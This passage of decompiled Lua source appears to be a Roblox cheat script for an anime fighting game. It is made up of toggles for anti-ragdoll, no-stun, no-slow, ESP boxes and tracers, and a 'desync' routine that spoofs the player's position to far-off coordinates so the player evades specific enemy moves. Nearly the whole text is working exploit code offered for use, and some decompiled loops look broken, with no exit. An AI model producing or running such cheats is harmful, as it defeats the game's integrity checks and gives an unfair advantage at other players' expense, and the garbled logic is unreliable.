                                                        tmp1009.Velocity = addedDesc.Velocity * Options.BDDistance.Value
                                                        RenderStepped:Wait()
                                                    end
                                                    if tmp1009 and tmp1009.Parent then
                                                        tmp1009:Destroy()
                                                        table.remove(up1000, table.find(up1000, tmp1009))
                                                    end
                                                end
                                                return
                                            end
                                        end
                                        if Toggles.CustomSideDash.Value then
                                            local tmp1010 = addedDesc:Clone()
                                            tmp1010:SetAttribute("Clone", true)
                                            table.insert(up1000, tmp1010)
                                            addedDesc.Parent = workspace
                                            while addedDesc and addedDesc.Parent do
                                                tmp1010.Parent = myRoot
                                                tmp1010.Velocity = addedDesc.Velocity * Options.SDDistance.Value
                                                RenderStepped:Wait()
                                            end
                                            if tmp1010 and tmp1010.Parent then
                                                tmp1010:Destroy()
                                                table.remove(up1000, table.find(up1000, tmp1010))
                                            end
                                        end
                                    end
                                else
                                    if Toggles.CustomFrontDash.Value then
                                        addedDesc:SetAttribute("Speed", Options.FDDistance.Value)
                                    end
                                    local tmp1011, tmp1012, tmp1013 = pairs(up1000)
                                    while true do
                                        local tmp1014
                                        tmp1013, tmp1014 = tmp1011(tmp1012, tmp1013)
                                        if tmp1013 == nil then
                                            break
                                        end
                                        tmp1014:Destroy()
                                    end
                                    table.clear(up1000)
                                end
                            end
                            if addedDesc:IsA("Accessory") then
                                if table.find({
                                    "Slowed",
                                    "StopRunning",
                                    "ComboStun"
                                }, addedDesc.Name) and rawget(Options.CharacterExploits.Value, "No Slow") then
                                    if addedDesc.Name ~= "Slowed" then
                                        if addedDesc.Name == "StopRunning" or addedDesc.Name == "ComboStun" then
                                            deleteNew(addedDesc)
                                        end
                                    else
                                        local tmp1015 = myHumanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                                            myHumanoid.WalkSpeed = myChar:GetAttribute("Ulted") and (myChar:GetAttribute("Running") and 32 or 16) or (myChar:GetAttribute("Running") and 25 or 16)
                                        end)
                                        myHumanoid.WalkSpeed = myChar:GetAttribute("Ulted") and (myChar:GetAttribute("Running") and 32 or 16) or (myChar:GetAttribute("Running") and 25 or 16)
                                        repeat
                                            RenderStepped:Wait()
                                        until addedDesc.Parent ~= myChar
                                        tmp1015:Disconnect()
                                    end
                                elseif (addedDesc.Name == "Freeze" or addedDesc.Name == "AntiMove") and rawget(Options.CharacterExploits.Value, "No Stun") then
                                    local tmp1016 = myHumanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                                        myHumanoid.WalkSpeed = myChar:GetAttribute("Ulted") and (myChar:GetAttribute("Running") and 32 or 16) or (myChar:GetAttribute("Running") and 25 or 16)
                                    end)
                                    myHumanoid.WalkSpeed = myChar:GetAttribute("Ulted") and (myChar:GetAttribute("Running") and 32 or 16) or (myChar:GetAttribute("Running") and 25 or 16)
                                    repeat
                                        RenderStepped:Wait()
                                    until addedDesc.Parent ~= myChar
                                    tmp1016:Disconnect()
                                elseif addedDesc.Name ~= "NoJump" or not rawget(Options.CharacterExploits.Value, "No Jump Bypass") then
                                    if (addedDesc.Name == "NoRotate" or addedDesc.Name == "NoRotateUltimate") and rawget(Options.CharacterExploits.Value, "No Rotations Bypass") then
                                        task.spawn(pcall, deleteNew, addedDesc, false)
                                    elseif addedDesc.Name ~= "Ragdoll" then
                                        if addedDesc.Name ~= "RagdollSim" then
                                            if addedDesc.Name ~= "BeingLaunched" then
                                                if addedDesc.Name == "ThrowTrashcan" then
                                                    FeatureFlags["Trashcan Launch"] = true
                                                    task.wait(0.25)
                                                    FeatureFlags["Trashcan Launch"] = false
                                                end
                                            elseif Toggles.LaunchHide.Value and myHumanoid.Health > 0 and not myChar:FindFirstChild("ExtraHitbox") then
                                                local tmp1017 = tick()
                                                repeat
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                until tick() >= tmp1017 + 3 or (myChar:FindFirstChild("LaunchEnded") or myHumanoid.Health <= 0)
                                                getgenv().desync = nil
                                            end
                                        elseif rawget(Options.CharacterExploits.Value, "Anti Ragdoll") then
                                            task.spawn(pcall, deleteNew, addedDesc, false)
                                        end
                                    else
                                        if rawget(Options.CharacterExploits.Value, "Anti Ragdoll") then
                                            addedDesc:Remove()
                                        end
                                        if Toggles.AutoRagdollCancel.Value then
                                            communicate({
                                                Dash = Enum.KeyCode.S,
                                                Key = Enum.KeyCode.Q,
                                                Goal = "KeyPress"
                                            })
                                        end
                                        task.spawn(function()
                                            if Toggles.RagdollHide.Value and myHumanoid.Health > 0 and not myChar:FindFirstChild("ExtraHitbox") then
                                                tick()
                                                repeat
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                until not addedDesc or (not addedDesc.Parent or myHumanoid.Health <= 0)
                                                getgenv().desync = nil
                                            end
                                        end)
                                    end
                                else
                                    task.spawn(pcall, deleteNew, addedDesc, false)
                                end
                            end
                            return
                        end
                    end)
                end
            end
            
--[[ 23. INIT PER-PLAYER ]]
function initOthers(plr)
                if not playerConnections[plr] then
                    playerConnections[plr] = {}
                end
                if PlayerData.Players[plr] then
                    local tmp1019, tmp1020, tmp1021 = pairs(PlayerData.Players[plr])
                    while true do
                        local tmp1022
                        tmp1021, tmp1022 = tmp1019(tmp1020, tmp1021)
                        if tmp1021 == nil then
                            break
                        end
                        tmp1022:Remove()
                    end
                    table.remove(PlayerData.Players, table.find(PlayerData.Players, plr))
                end
                PlayerData.Players[plr] = {}
                local tmp1023, tmp1024, tmp1025 = pairs(playerConnections[plr])
                while true do
                    local tmp1026
                    tmp1025, tmp1026 = tmp1023(tmp1024, tmp1025)
                    if tmp1025 == nil then
                        break
                    end
                    tmp1026:Disconnect()
                end
                table.clear(playerConnections[plr])
                repeat
                    task.wait()
                until getChar(plr) and (getRoot(getChar(plr)) and getHumanoid(getChar(plr))) or not playerConnections[plr]
                local targetChar = getChar(plr)
                local targetRoot
                if targetChar then
                    targetRoot = getRoot(targetChar)
                else
                    targetRoot = targetChar
                end
                local targetHum
                if targetChar then
                    targetHum = getHumanoid(targetChar)
                else
                    targetHum = targetChar
                end
                if targetChar and (targetRoot and (targetHum and playerConnections[plr])) then
                    task.spawn(function()
                        local tmp1030 = targetChar
                        local tmp1031, tmp1032, tmp1033 = pairs(tmp1030:GetDescendants())
                        while true do
                            local up1034
                            tmp1033, up1034 = tmp1031(tmp1032, tmp1033)
                            if tmp1033 == nil then
                                break
                            end
                            if up1034:IsA("BasePart") and (up1034 ~= targetRoot and up1034.Transparency ~= 1) and not up1034.Name:lower():find("hitbox") then
                                task.spawn(function()
                                    while task.wait() and (not getChar(plr) or getChar(plr) == targetChar) and playerConnections[plr] do
                                        if up1034 and Toggles.AntiExploits_Invisibility.Value then
                                            local tmp1035 = targetHum
                                            local tmp1036, tmp1037, tmp1038 = pairs(tmp1035:GetPlayingAnimationTracks())
                                            while true do
                                                local tmp1039
                                                tmp1038, tmp1039 = tmp1036(tmp1037, tmp1038)
                                                if tmp1038 == nil then
                                                    break
                                                end
                                                local tmp1040, tmp1041, tmp1042 = pairs(MusicIds)
                                                while true do
                                                    local tmp1043
                                                    tmp1042, tmp1043 = tmp1040(tmp1041, tmp1042)
                                                    if tmp1042 == nil then
                                                        break
                                                    end
                                                    if tmp1039.Animation.AnimationId:match(tmp1043) and tmp1039.Speed ~= 1 then
                                                        repeat
                                                            up1034.Transparency = 0.5
                                                            RenderStepped:Wait()
                                                        until not (tmp1039.IsPlaying and Toggles.AntiExploits_Invisibility.Value)
                                                        up1034.Transparency = 0
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end)
                            end
                        end
                    end)
                    local espQuad = Draw("Quad", {
                        Transparency = 1,
                        Filled = false,
                        Visible = false
                    })
                    local up1045 = Draw("Line", {
                        Visible = false
                    })
                    table.insert(PlayerData.Players[plr], espQuad)
                    table.insert(PlayerData.Players[plr], up1045)
                    local tmp1046 = RenderStepped
                    playerConnections[plr][# playerConnections[plr] + 1] = tmp1046:Connect(function()
                        if Toggles.AntiExploits_Fling.Value then
                            targetRoot.Velocity = Vector3.new()
                            targetRoot.RotVelocity = Vector3.new()
                            targetRoot.AssemblyLinearVelocity = Vector3.new()
                            targetRoot.AssemblyAngularVelocity = Vector3.new()
                        end
                        local tmp1047 = workspace.CurrentCamera
                        if tmp1047 then
                            local tmp1048, tmp1049 = tmp1047:WorldToViewportPoint(targetRoot.Position)
                            local tmp1050 = targetRoot.CFrame
                            if Toggles.FaceCamera.Value then
                                tmp1050 = CFrame.new(tmp1050.p, tmp1050.p - tmp1047.CFrame.lookVector)
                            end
                            local tmp1051 = CFrame.new(0, 0, 0)
                            local tmp1052 = Vector3.new(4, 6, 0)
                            local tmp1053 = {
                                TopLeft = tmp1050 * tmp1051 * CFrame.new(tmp1052.X / 2, tmp1052.Y / 2, 0),
                                TopRight = tmp1050 * tmp1051 * CFrame.new(- tmp1052.X / 2, tmp1052.Y / 2, 0),
                                BottomLeft = tmp1050 * tmp1051 * CFrame.new(tmp1052.X / 2, - tmp1052.Y / 2, 0),
                                BottomRight = tmp1050 * tmp1051 * CFrame.new(- tmp1052.X / 2, - tmp1052.Y / 2, 0),
                                TagPos = tmp1050 * tmp1051 * CFrame.new(0, tmp1052.Y / 2, 0),
                                Torso = tmp1050 * tmp1051
                            }
                            if espQuad then
                                if Toggles.BoxESP.Value and (tmp1048 and tmp1049) then
                                    local tmp1054, tmp1055 = tmp1047:WorldToViewportPoint(tmp1053.TopLeft.p)
                                    local tmp1056, tmp1057 = tmp1047:WorldToViewportPoint(tmp1053.TopRight.p)
                                    local tmp1058, tmp1059 = tmp1047:WorldToViewportPoint(tmp1053.BottomLeft.p)
                                    local tmp1060, tmp1061 = tmp1047:WorldToViewportPoint(tmp1053.BottomRight.p)
                                    if tmp1055 or (tmp1057 or (tmp1059 or tmp1061)) then
                                        espQuad.PointA = Vector2.new(tmp1056.X, tmp1056.Y)
                                        espQuad.PointB = Vector2.new(tmp1054.X, tmp1054.Y)
                                        espQuad.PointC = Vector2.new(tmp1058.X, tmp1058.Y)
                                        espQuad.PointD = Vector2.new(tmp1060.X, tmp1060.Y)
                                        espQuad.Color = Options.BoxColor.Value
                                        espQuad.Thickness = Options.BoxThickness.Value
                                        espQuad.Transparency = Options.BoxTransparency.Value
                                        espQuad.Visible = true
                                    else
                                        espQuad.Visible = false
                                        espQuad.Thickness = 0
                                    end
                                else
                                    espQuad.Visible = false
                                    espQuad.Thickness = 0
                                end
                            end
                            if up1045 then
                                if Toggles.Tracers.Value and (tmp1048 and tmp1049) then
                                    if Toggles.UnlockTracers.Value then
                                        up1045.From = Vector2.new(Mouse.X, Mouse.Y + 60)
                                    else
                                        up1045.From = Vector2.new(tmp1047.ViewportSize.X / 2, tmp1047.ViewportSize.Y / 1)
                                    end
                                    up1045.To = Vector2.new(tmp1048.X, tmp1048.Y)
                                    up1045.Color = Options.TracerColor.Value
                                    up1045.Thickness = Options.TracerThickness.Value
                                    up1045.Transparency = Options.TracerTransparency.Value
                                    up1045.Visible = true
                                else
                                    up1045.Visible = false
                                end
                            end
                        else
                            up1045.Visible = false
                            espQuad.Visible = false
                        end
                    end)
                    playerConnections[plr][# playerConnections[plr] + 1] = targetChar.ChildAdded:Connect(function(arg1062)
                        if arg1062:IsA("Accessory") and arg1062.Name == "Counter" then
                            MoveNotify(plr, "Death Counter")
                            if Toggles.ShowDeathCounter.Value then
                                local tmp1063 = {
                                    Parent = targetRoot,
                                    SoundId = "rbxassetid://6476791205",
                                    Volume = 10
                                }
                                Create("Sound", tmp1063):Play()
                                local up1064 = {}
                                for tmp1065 = 1, 10 do
                                    local tmp1066 = Random.new():NextNumber(0.9, 1.1)
                                    local up1067 = ReplicatedStorage.Resources.LegacyReplication.Menacing:Clone()
                                    up1067.Enabled = true
                                    up1067.Size = UDim2.new(tmp1066, 0, tmp1066, 0)
                                    local tmp1068 = Random.new():NextNumber(- 4, 4)
                                    local tmp1069 = math.random(- 4, 4)
                                    up1067.StudsOffsetWorldSpace = Vector3.new(tmp1068, 0, tmp1069)
                                    up1067.Parent = targetRoot
                                    table.insert(up1064, up1067)
                                    task.delay(tmp1065, function()
                                        if up1067.Parent then
                                            table.remove(up1064, table.find(up1064, up1067))
                                            TweenService:Create(up1067, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                                                StudsOffsetWorldSpace = up1067.StudsOffsetWorldSpace - Vector3.new(0, 10, 0)
                                            }):Play()
                                            TweenService:Create(up1067.ImageLabel, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                ImageTransparency = 1
                                            }):Play()
                                        end
                                    end)
                                end
                                local tmp1070 = {}
                                local tmp1071 = {
                                    Parent = true
                                }
                                while wait() do
                                    local tmp1072, tmp1073, tmp1074 = pairs(up1064)
                                    while true do
                                        local tmp1075
                                        tmp1074, tmp1075 = tmp1072(tmp1073, tmp1074)
                                        if tmp1074 == nil then
                                            break
                                        end
                                        if not tmp1070[tmp1075] then
                                            tmp1070[tmp1075] = tmp1075.StudsOffsetWorldSpace
                                        end
                                        local tmp1076 = tmp1070[tmp1075]
                                        local tmp1077 = Random.new():NextNumber(- 0.04, 0.04)
                                        tmp1075.StudsOffsetWorldSpace = tmp1076 + Vector3.new(tmp1077, tmp1077, tmp1077)
                                    end
                                    if not (tmp1071 and tmp1071.Parent) then
                                        local tmp1078, tmp1079, tmp1080 = pairs(up1064)
                                        while true do
                                            local tmp1081
                                            tmp1080, tmp1081 = tmp1078(tmp1079, tmp1080)
                                            if tmp1080 == nil then
                                                break
                                            end
                                            local tmp1082 = Random.new():NextNumber(2, 3)
                                            TweenService:Create(tmp1081, TweenInfo.new(tmp1082, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                                                StudsOffsetWorldSpace = tmp1070[tmp1081] - Vector3.new(0, 10, 0)
                                            }):Play()
                                            TweenService:Create(tmp1081.ImageLabel, TweenInfo.new(tmp1082, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                ImageTransparency = 1
                                            }):Play()
                                        end
                                        local up1083 = up1064
                                        task.delay(3, function()
                                            local tmp1084, tmp1085, tmp1086 = pairs(up1083)
                                            while true do
                                                local tmp1087
                                                tmp1086, tmp1087 = tmp1084(tmp1085, tmp1086)
                                                if tmp1086 == nil then
                                                    break
                                                end
                                                tmp1087:Destroy()
                                            end
                                        end)
                                        break
                                    end
                                end
                            end
                        end
                    end)
                    playerConnections[plr][# playerConnections[plr] + 1] = targetHum.AnimationPlayed:Connect(function(playedAnim)
                        local playedAnimId = playedAnim.Animation.AnimationId
                        local char = getChar(LocalPlayer)
                        local root
                        if char then
                            root = getRoot(char)
                        else
                            root = char
                        end
                        local hum
                        if char then
                            hum = getHumanoid(char)
                        else
                            hum = char
                        end
                        local up1093 = Toggles.AntiMovesMisc_BackdashCancel.Value
                        if char and (root and hum) then
                            task.spawn(function()
                                if playedAnim.WeightTarget == 0 or playedAnim.Speed == 0 then
                                    return
                                end
                                if playedAnimId:match("129945907044125") and isAnimPlaying(hum, "131226430469931") then
                                    targetChar:SetAttribute("CrushedRockVariant", true)
                                end
                                if playedAnimId:match("10468665991") and rawget(Options.AntiMoves_Saitama.Value, "Anti Normal Punch") then
                                    local tmp1094 = Instance.new("Part", Workspace)
                                    tmp1094.Anchored = true
                                    tmp1094.Size = Vector3.new(12.5, 5, 75)
                                    tmp1094.CanCollide = false
                                    tmp1094.Transparency = 1
                                    local tmp1095 = Instance.new("Part", Workspace)
                                    tmp1095.Anchored = true
                                    tmp1095.Size = Vector3.new(12.5, 5, 75)
                                    tmp1095.CanCollide = false
                                    tmp1095.Transparency = 1
                                    local tmp1096 = Instance.new("Part", Workspace)
                                    tmp1096.Anchored = true
                                    tmp1096.Size = Vector3.new(12.5, 5, 75)
                                    tmp1096.CanCollide = false
                                    tmp1096.Transparency = 1
                                    local up1097 = false
                                    local up1098 = false
                                    local up1099 = false
                                    local tmp1100 = {}
                                    table.insert(tmp1100, tmp1094.Touched:Connect(function(arg1101)
                                        if arg1101 == root then
                                            up1097 = true
                                        end
                                    end))
                                    table.insert(tmp1100, tmp1094.TouchEnded:Connect(function(arg1102)
                                        if arg1102 == root then
                                            up1097 = false
                                        end
                                    end))
                                    table.insert(tmp1100, tmp1095.Touched:Connect(function(arg1103)
                                        if arg1103 == root then
                                            up1098 = true
                                        end
                                    end))
                                    table.insert(tmp1100, tmp1095.TouchEnded:Connect(function(arg1104)
                                        if arg1104 == root then
                                            up1098 = false
                                        end
                                    end))
                                    table.insert(tmp1100, tmp1096.Touched:Connect(function(arg1105)
                                        if arg1105 == root then
                                            up1099 = true
                                        end
                                    end))
                                    table.insert(tmp1100, tmp1096.TouchEnded:Connect(function(arg1106)
                                        if arg1106 == root then
                                            up1099 = false
                                        end
                                    end))
                                    if up1093 then
                                        task.wait(0.35)
                                        tmp1094.CFrame = targetRoot.CFrame * CFrame.new(6, 0, - tmp1094.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(- 5), 0)
                                        tmp1095.CFrame = targetRoot.CFrame * CFrame.new(- 6, 0, - tmp1095.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(5), 0)
                                        tmp1096.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1096.Size.Z / 2 + 1.5)
                                        task.wait()
                                        if up1097 or (up1098 or up1099) then
                                            bdcancel()
                                        end
                                        tmp1094:Destroy()
                                        tmp1095:Destroy()
                                        tmp1096:Destroy()
                                        local tmp1107, tmp1108, tmp1109 = pairs(tmp1100)
                                        while true do
                                            local tmp1110
                                            tmp1109, tmp1110 = tmp1107(tmp1108, tmp1109)
                                            if tmp1109 == nil then
                                                break
                                            end
                                            tmp1110:Disconnect()
                                        end
                                        return
                                    end
                                    local tmp1111 = tick()
                                    local tmp1112 = up1099
                                    local tmp1113 = up1098
                                    local tmp1114 = up1097
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] NORMAL PUNCH")
                                            end
                                            tmp1094.CFrame = targetRoot.CFrame * CFrame.new(6, 0, - tmp1094.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(- 5), 0)
                                            tmp1095.CFrame = targetRoot.CFrame * CFrame.new(- 6, 0, - tmp1095.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(5), 0)
                                            tmp1096.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1096.Size.Z / 2 + 1.5)
                                            if (tmp1114 or (tmp1113 or tmp1112)) and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] NORMAL PUNCH")
                                                    end
                                                    tmp1094.CFrame = targetRoot.CFrame * CFrame.new(6, 0, - tmp1094.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(- 5), 0)
                                                    tmp1095.CFrame = targetRoot.CFrame * CFrame.new(- 6, 0, - tmp1095.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(5), 0)
                                                    tmp1096.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1096.Size.Z / 2 + 1.5)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if not (tmp1114 or (tmp1113 or tmp1112)) or (tick() >= tmp1111 + 0.8 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1111 + 0.8 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            tmp1094:Destroy()
                                            tmp1095:Destroy()
                                            tmp1096:Destroy()
                                            local tmp1115, tmp1116, tmp1117 = pairs(tmp1100)
                                            while true do
                                                local tmp1118
                                                tmp1117, tmp1118 = tmp1115(tmp1116, tmp1117)
                                                if tmp1117 == nil then
                                                    break
                                                end
                                                tmp1118:Disconnect()
                                            end
                                        end
                                    end
                                end
                                if playedAnimId:match("10466974800") and rawget(Options.AntiMoves_Saitama.Value, "Anti Consecutive Punches") then
                                    local tmp1119 = Instance.new("Part", Workspace)
                                    tmp1119.Anchored = true
                                    tmp1119.Size = Vector3.new(12.5, 5, 12.5)
                                    tmp1119.CanCollide = false
                                    tmp1119.Transparency = 1
                                    local up1120 = false
                                    local tmp1122 = tmp1119.Touched:Connect(function(arg1121)
                                        if arg1121 == root then
                                            up1120 = true
                                        end
                                    end)
                                    local tmp1124 = tmp1119.TouchEnded:Connect(function(arg1123)
                                        if arg1123 == root then
                                            up1120 = false
                                        end
                                    end)
                                    local tmp1125 = tick()
                                    local tmp1126 = up1120
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] CONSECUTIVE PUNCHES")
                                            end
                                            tmp1119.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1119.Size.Z / 2)
                                            if tmp1126 == true and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] CONSECUTIVE PUNCHES")
                                                    end
                                                    tmp1119.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1119.Size.Z / 2)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1126 == false or (tick() >= tmp1125 + 1.5 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1125 + 1.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1119 then
                                                tmp1119:Destroy()
                                            end
                                            tmp1122:Disconnect()
                                            tmp1124:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("10471336737") and rawget(Options.AntiMoves_Saitama.Value, "Anti Shove") then
                                    local tmp1127 = Instance.new("Part", Workspace)
                                    tmp1127.Anchored = true
                                    tmp1127.Size = Vector3.new(7.5, 5, 7.5)
                                    tmp1127.CanCollide = false
                                    tmp1127.Transparency = 1
                                    local up1128 = false
                                    local tmp1130 = tmp1127.Touched:Connect(function(arg1129)
                                        if arg1129 == root then
                                            up1128 = true
                                        end
                                    end)
                                    local tmp1132 = tmp1127.TouchEnded:Connect(function(arg1131)
                                        if arg1131 == root then
                                            up1128 = false
                                        end
                                    end)
                                    tmp1127.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1127.Size.Z / 2)
                                    if up1093 then
                                        task.wait()
                                        if up1128 and not isCountering(hum) then
                                            bdcancel()
                                        end
                                        tmp1127:Destroy()
                                        tmp1130:Disconnect()
                                        tmp1132:Disconnect()
                                        return
                                    end
                                    local tmp1133 = tick()
                                    local tmp1134 = up1128
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] SHOVE")
                                            end
                                            tmp1127.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1127.Size.Z / 2)
                                            if tmp1134 ~= true or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] SHOVE")
                                                end
                                                tmp1127.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1127.Size.Z / 2)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tmp1134 == false or (tick() >= tmp1133 + 0.5 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1133 + 0.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1127 then
                                                tmp1127:Destroy()
                                            end
                                            tmp1130:Disconnect()
                                            tmp1132:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("12510170988") and rawget(Options.AntiMoves_Saitama.Value, "Anti Uppercut") then
                                    task.wait(0.25)
                                    if not playedAnim.IsPlaying then
                                    end
                                    local tmp1135 = Instance.new("Part", Workspace)
                                    tmp1135.Anchored = true
                                    tmp1135.Size = Vector3.new(10, 10, 10)
                                    tmp1135.CanCollide = false
                                    tmp1135.Transparency = 1
                                    local up1136 = false
                                    local tmp1138 = tmp1135.Touched:Connect(function(arg1137)
                                        if arg1137 == root then
                                            up1136 = true
                                        end
                                    end)
                                    local tmp1140 = tmp1135.TouchEnded:Connect(function(arg1139)
                                        if arg1139 == root then
                                            up1136 = false
                                        end
                                    end)
                                    if up1093 then
                                        task.wait(0.1)
                                        tmp1135.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1135.Size.Z / 2)
                                        task.wait()
                                        if up1136 and not isCountering(hum) then
                                            bdcancel()
                                        end
                                        tmp1135:Destroy()
                                        tmp1138:Disconnect()
                                        tmp1140:Disconnect()
                                        return
                                    end
                                    local tmp1141 = tick()
                                    local tmp1142 = up1136
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] UPPERCUT")
                                            end
                                            tmp1135.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1135.Size.Z / 2)
                                            if tmp1142 == true and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] UPPERCUT")
                                                    end
                                                    tmp1135.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1135.Size.Z / 2)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1142 == false or (tick() >= tmp1141 + 0.5 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1141 + 0.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1135 then
                                                tmp1135:Destroy()
                                            end
                                            tmp1138:Disconnect()
                                            tmp1140:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("11343318134") and rawget(Options.AntiMoves_Saitama.Value, "Anti Death Counter") then
                                    task.wait(7.5)
                                    local tmp1143 = Instance.new("Part", Workspace)
                                    tmp1143.Anchored = true
                                    tmp1143.Size = Vector3.new(125, 5, 500)
                                    tmp1143.CanCollide = false
                                    tmp1143.Transparency = 1
                                    local tmp1144 = Instance.new("Part", Workspace)
                                    tmp1144.Anchored = true
                                    tmp1144.Size = Vector3.new(125, 5, 500)
                                    tmp1144.CanCollide = false
                                    tmp1144.Transparency = 1
                                    local tmp1145 = Instance.new("Part", Workspace)
                                    tmp1145.Anchored = true
                                    tmp1145.Size = Vector3.new(125, 5, 500)
                                    tmp1145.CanCollide = false
                                    tmp1145.Transparency = 1
                                    local up1146 = false
                                    local up1147 = false
                                    local up1148 = false
                                    local tmp1149 = {}
                                    table.insert(tmp1149, tmp1143.Touched:Connect(function(arg1150)
                                        if arg1150 == root then
                                            up1146 = true
                                        end
                                    end))
                                    table.insert(tmp1149, tmp1143.TouchEnded:Connect(function(arg1151)
                                        if arg1151 == root then
                                            up1146 = false
                                        end
                                    end))
                                    table.insert(tmp1149, tmp1144.Touched:Connect(function(arg1152)
                                        if arg1152 == root then
                                            up1147 = true
                                        end
                                    end))
                                    table.insert(tmp1149, tmp1144.TouchEnded:Connect(function(arg1153)
                                        if arg1153 == root then
                                            up1147 = false
                                        end
                                    end))
                                    table.insert(tmp1149, tmp1145.Touched:Connect(function(arg1154)
                                        if arg1154 == root then
                                            up1148 = true
                                        end
                                    end))
                                    table.insert(tmp1149, tmp1145.TouchEnded:Connect(function(arg1155)
                                        if arg1155 == root then
                                            up1148 = false
                                        end
                                    end))
                                    local tmp1156 = tick()
                                    local tmp1157 = up1148
                                    local tmp1158 = up1147
                                    local tmp1159 = up1146
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] DEATH COUNTER")
                                            end
                                            tmp1143.CFrame = targetRoot.CFrame * CFrame.new(60, 0, - tmp1143.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(- 15), 0)
                                            tmp1144.CFrame = targetRoot.CFrame * CFrame.new(- 60, 0, - tmp1144.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(15), 0)
                                            tmp1145.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1145.Size.Z / 2 + 1.5)
                                            if not (tmp1159 or (tmp1158 or (tmp1157 or touchingMiddle))) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] DEATH COUNTER")
                                                end
                                                tmp1143.CFrame = targetRoot.CFrame * CFrame.new(60, 0, - tmp1143.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(- 15), 0)
                                                tmp1144.CFrame = targetRoot.CFrame * CFrame.new(- 60, 0, - tmp1144.Size.Z / 2 + 1.5) * CFrame.Angles(0, math.rad(15), 0)
                                                tmp1145.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1145.Size.Z / 2 + 1.5)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if not (tmp1159 or (tmp1158 or (tmp1157 or touchingMiddle))) or (tick() >= tmp1156 + 2.5 or not playedAnim.IsPlaying) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1156 + 2.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            tmp1143:Destroy()
                                            tmp1144:Destroy()
                                            tmp1145:Destroy()
                                            local tmp1160, tmp1161, tmp1162 = pairs(tmp1149)
                                            while true do
                                                local tmp1163
                                                tmp1162, tmp1163 = tmp1160(tmp1161, tmp1162)
